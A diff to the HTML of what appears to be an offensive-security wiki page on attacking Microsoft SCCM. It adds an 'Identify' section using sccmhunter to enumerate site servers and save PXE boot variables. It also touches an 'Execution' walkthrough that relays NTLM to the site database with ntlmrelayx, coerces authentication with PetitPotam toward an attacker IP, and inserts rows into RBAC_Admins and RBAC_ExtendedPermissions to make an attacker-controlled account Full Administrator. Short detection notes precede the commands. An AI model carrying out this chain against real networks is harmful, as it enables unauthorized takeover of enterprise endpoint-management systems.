@@ -4115,6 +4115,29 @@
   
   
     <li class="md-nav__item">
+      <a href="../../Initial%20Access%20%26%20Delivery/Pre-Boot%20Execution%20Environment%20PXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pre Boot Execution Environment PXE
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../Initial%20Access%20%26%20Delivery/Word%20Doc%20Macro/" class="md-nav__link">
         
   
@@ -4797,6 +4820,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#execution" class="md-nav__link">
     <span class="md-ellipsis">
       Execution
@@ -5084,6 +5116,15 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#execution" class="md-nav__link">
     <span class="md-ellipsis">
       Execution
@@ -5180,47 +5221,109 @@
 <li><strong>Relay Detection:</strong> NTLM relay traffic is highly suspicious. A machine account authenticating from an unexpected host (the attacker's relay) is a major red flag.</li>
 <li><strong>Database Auditing:</strong> Direct writes to sensitive SCCM tables like <code>RBAC_Admins</code> are a high-fidelity indicator of compromise if database auditing is enabled.</li>
 </ul>
+<h2 id="identify">Identify</h2>
+<hr />
+<p>If <code>CN=System Management,CN=System</code> AD object exists, sccm is installed LDAP also creates new <code>object class</code> entries, such as <code>mssmsmanagementpoint</code> or <code>mssmssite</code>.</p>
+<p>Using <a href="https://github.com/garrettfoster13/sccmhunter">sccmhunter</a> </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>git<span class="w"> </span>clone<span class="w"> </span>-q<span class="w"> </span>https://github.com/garrettfoster13/sccmhunter
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">cd</span><span class="w"> </span>sccmhunter
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>.sccmhunter
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">source</span><span class="w"> </span>.sccmhunter/bin/activate
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+</span></code></pre></div>
+<p><a href="https://github.com/garrettfoster13/sccmhunter">Sccmhunter</a> will help us extract from each server the following information:</p>
+<ul>
+<li>The SCCM site code. </li>
+<li>Whether the server is a Central Administration Site (CAS). </li>
+<li>The SMB signing status (helpful in performing later NTLM relay attacks). </li>
+<li>Whether the server is the SCCM Primary Server or not. </li>
+<li>Whether it is the SCCM Distribution Point or not. </li>
+<li>Whether it is the SCCM SMS Provider or not. </li>
+<li>Whether the WSUS and MSSQL services are running on it or not.</li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>sccmhunter.py<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc-ip&gt;
+</span></code></pre></div>
+<p>This command performs these checks:
+1. Checks the DACL for the <code>System Management</code> container manually created during AD schema extension.
+2. Checks for published <code>Managment Points</code>.
+3. Checks for strings <code>SCCM</code> and <code>MECM</code> in the entire directory.</p>
+<div class="admonition alert">
+<p class="admonition-title">note</p>
+<p>To see the results, we can use the <code>-debug</code> option during the command execution or use <code>show -all</code> after we execute the command:</p>
+</div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>python3<span class="w"> </span>sccmhunter.py<span class="w"> </span>show<span class="w"> </span>-all
+</span></code></pre></div>
+<p>Additionally, we can utilize the <code>smb</code> module to profile and list SMB shares of identified SCCM servers.</p>
+<ol>
+<li>
+<p>Profiling the site server:</p>
+<ul>
+<li>Validates connectivity.</li>
+<li>Verifies if the site server hosts the MSSQL service.</li>
+<li>Determines if the site server is active or passive.</li>
+<li>Identify whether the site server is a central administration site.</li>
+</ul>
+</li>
+<li>
+<p>Management point verifications.</p>
+<ul>
+<li>Validates connectivity to the HTTP endpoints.</li>
+</ul>
+</li>
+<li>
+<p>Checks for roles and configurations.</p>
+<ul>
+<li>Searches for associated site codes from default file shares.</li>
+<li>Verify whether the SMB signing is turned off.</li>
+<li>Identifies the site system roles such as Site Server, Management Point, Distribution Point, SMS Provider, MSSQL, and WSUS.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Search for PXEBoot variables and save them:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>sccmhunter.py<span class="w"> </span>smb<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>-d<span class="w"> </span>domain.local<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;dc-ip&gt;<span class="w"> </span>-save
+</span></code></pre></div>
+<p>Additionally, the <a href="https://github.com/Mayyhem/SharpSCCM">SharpSCCM</a> (C#) tool can also be utilized on Windows systems and it provides features for enumeration, credential gathering and lateral movement without requring access to the SCCM administration console.</p>
 <h2 id="execution">Execution</h2>
 <hr />
 <p><strong>Step 1: Set up NTLM Relay</strong></p>
 <p>Use <code>ntlmrelayx.py</code> to listen for incoming connections and relay them to the target MSSQL server. The <code>-socks</code> flag creates a proxy session upon successful relay.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span><span class="s2">&quot;mssql://&lt;MSSQL_SERVER_IP&gt;&quot;</span><span class="w"> </span>-smb2support<span class="w"> </span>-socks
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>impacket-ntlmrelayx<span class="w"> </span>-t<span class="w"> </span><span class="s2">&quot;mssql://&lt;MSSQL_SERVER_IP&gt;&quot;</span><span class="w"> </span>-smb2support<span class="w"> </span>-socks
 </span></code></pre></div>
 <p><strong>Step 2: Coerce Authentication</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>&lt;ATTACKER_IP&gt;<span class="w"> </span>&lt;PRIMARY_SITE_SERVER_IP&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;password&gt;&#39;</span><span class="w"> </span>-d<span class="w"> </span>&lt;domain&gt;<span class="w"> </span>&lt;ATTACKER_IP&gt;<span class="w"> </span>&lt;PRIMARY_SITE_SERVER_IP&gt;
 </span></code></pre></div>
 <p><strong>Step 3: Access the Database via Relayed Session</strong></p>
 <p>Use the created SOCKS proxy with proxychains and mssqlclient.py to connect to the database as the relayed machine account.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>proxychains4<span class="w"> </span>-q<span class="w"> </span>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span><span class="s1">&#39;DOMAIN/PRIMARY_SITE_SERVER_NAME$&#39;</span>@&lt;MSSQL_SERVER_IP&gt;<span class="w"> </span>-windows-auth<span class="w"> </span>-no-pass
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>proxychains4<span class="w"> </span>-q<span class="w"> </span>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span><span class="s1">&#39;DOMAIN/PRIMARY_SITE_SERVER_NAME$&#39;</span>@&lt;MSSQL_SERVER_IP&gt;<span class="w"> </span>-windows-auth<span class="w"> </span>-no-pass
 </span></code></pre></div>
 <p><strong>Step 4: Grant Admin Privileges in the Database</strong></p>
 <p>Execute a series of SQL queries to add an attacker-controlled user (e.g., LAB\User) as a Full Administrator.</p>
 <p>Get SID</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-DomainUser</span> <span class="p">&lt;</span><span class="n">User</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Get-DomainUser</span> <span class="p">&lt;</span><span class="n">User</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">objectsid</span>
 </span></code></pre></div>
 <p>Convert to binary</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">function</span><span class="w"> </span>Convert-StringSidToBinary<span class="w"> </span><span class="o">{</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">    </span>param<span class="w"> </span><span class="o">([</span>string<span class="o">]</span><span class="nv">$StringSid</span><span class="o">)</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="nv">$sid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Security.Principal.SecurityIdentifier<span class="w"> </span><span class="nv">$StringSid</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">    </span><span class="nv">$binarySid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>byte<span class="o">[]</span><span class="w"> </span><span class="o">(</span><span class="nv">$sid</span>.BinaryLength<span class="o">)</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">    </span><span class="nv">$sid</span>.GetBinaryForm<span class="o">(</span><span class="nv">$binarySid</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span><span class="nv">$binarySidHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nv">$binarySid</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nv">$_</span>.ToString<span class="o">(</span><span class="s2">&quot;X2&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">})</span><span class="w"> </span>-join<span class="w"> </span><span class="s1">&#39;&#39;</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;0x</span><span class="k">$(</span><span class="nv">$binarySidHex</span>.ToLower<span class="o">(</span><span class="k">)</span><span class="s2">)&quot;</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">}</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>Convert-StringSidToBinary<span class="w"> </span><span class="s2">&quot;&lt;SID&gt;&quot;</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">function</span><span class="w"> </span>Convert-StringSidToBinary<span class="w"> </span><span class="o">{</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">    </span>param<span class="w"> </span><span class="o">([</span>string<span class="o">]</span><span class="nv">$StringSid</span><span class="o">)</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="nv">$sid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Security.Principal.SecurityIdentifier<span class="w"> </span><span class="nv">$StringSid</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="nv">$binarySid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>byte<span class="o">[]</span><span class="w"> </span><span class="o">(</span><span class="nv">$sid</span>.BinaryLength<span class="o">)</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">    </span><span class="nv">$sid</span>.GetBinaryForm<span class="o">(</span><span class="nv">$binarySid</span>,<span class="w"> </span><span class="m">0</span><span class="o">)</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="nv">$binarySidHex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nv">$binarySid</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>ForEach-Object<span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="nv">$_</span>.ToString<span class="o">(</span><span class="s2">&quot;X2&quot;</span><span class="o">)</span><span class="w"> </span><span class="o">})</span><span class="w"> </span>-join<span class="w"> </span><span class="s1">&#39;&#39;</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;0x</span><span class="k">$(</span><span class="nv">$binarySidHex</span>.ToLower<span class="o">(</span><span class="k">)</span><span class="s2">)&quot;</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="o">}</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>Convert-StringSidToBinary<span class="w"> </span><span class="s2">&quot;&lt;SID&gt;&quot;</span>
 </span></code></pre></div>
 <p>Add user into admins table</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">USE</span><span class="w"> </span><span class="n">CM_</span><span class="o">&lt;</span><span class="n">SiteCode</span><span class="o">&gt;</span><span class="p">;</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_Admins</span><span class="w"> </span><span class="p">(</span><span class="n">AdminSID</span><span class="p">,</span><span class="w"> </span><span class="n">LogonName</span><span class="p">,</span><span class="w"> </span><span class="n">IsGroup</span><span class="p">,</span><span class="w"> </span><span class="n">IsDeleted</span><span class="p">,</span><span class="w"> </span><span class="n">SourceSite</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">hex</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">convertedsid</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;LAB\User&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&lt;SiteCode&gt;&#39;</span><span class="p">);</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">USE</span><span class="w"> </span><span class="n">CM_</span><span class="o">&lt;</span><span class="n">SiteCode</span><span class="o">&gt;</span><span class="p">;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_Admins</span><span class="w"> </span><span class="p">(</span><span class="n">AdminSID</span><span class="p">,</span><span class="w"> </span><span class="n">LogonName</span><span class="p">,</span><span class="w"> </span><span class="n">IsGroup</span><span class="p">,</span><span class="w"> </span><span class="n">IsDeleted</span><span class="p">,</span><span class="w"> </span><span class="n">SourceSite</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">hex</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">convertedsid</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;LAB\User&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&lt;SiteCode&gt;&#39;</span><span class="p">);</span>
 </span></code></pre></div>
 <p>Retrieve the new adminID</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">LogonName</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">RBAC_Admins</span><span class="p">;</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">LogonName</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">RBAC_Admins</span><span class="p">;</span>
 </span></code></pre></div>
 <p>Assign <code>Full Administrator</code> to yourself</p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_ExtendedPermissions</span><span class="w"> </span><span class="p">(</span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">RoleID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeTypeID</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">new_admin_id</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS0001R&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS00ALL&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;29&#39;</span><span class="p">);</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_ExtendedPermissions</span><span class="w"> </span><span class="p">(</span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">RoleID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeTypeID</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">new_admin_id</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS0001R&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS00001&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_ExtendedPermissions</span><span class="w"> </span><span class="p">(</span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">RoleID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeTypeID</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">new_admin_id</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS0001R&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS00004&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_ExtendedPermissions</span><span class="w"> </span><span class="p">(</span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">RoleID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeTypeID</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">new_admin_id</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS0001R&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS00ALL&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;29&#39;</span><span class="p">);</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_ExtendedPermissions</span><span class="w"> </span><span class="p">(</span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">RoleID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeTypeID</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">new_admin_id</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS0001R&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS00001&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">RBAC_ExtendedPermissions</span><span class="w"> </span><span class="p">(</span><span class="n">AdminID</span><span class="p">,</span><span class="w"> </span><span class="n">RoleID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeID</span><span class="p">,</span><span class="w"> </span><span class="n">ScopeTypeID</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">new_admin_id</span><span class="o">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS0001R&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SMS00004&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">);</span>
 </span></code></pre></div>
 <h2 id="cleanup-considerations">Cleanup Considerations</h2>
 <hr />
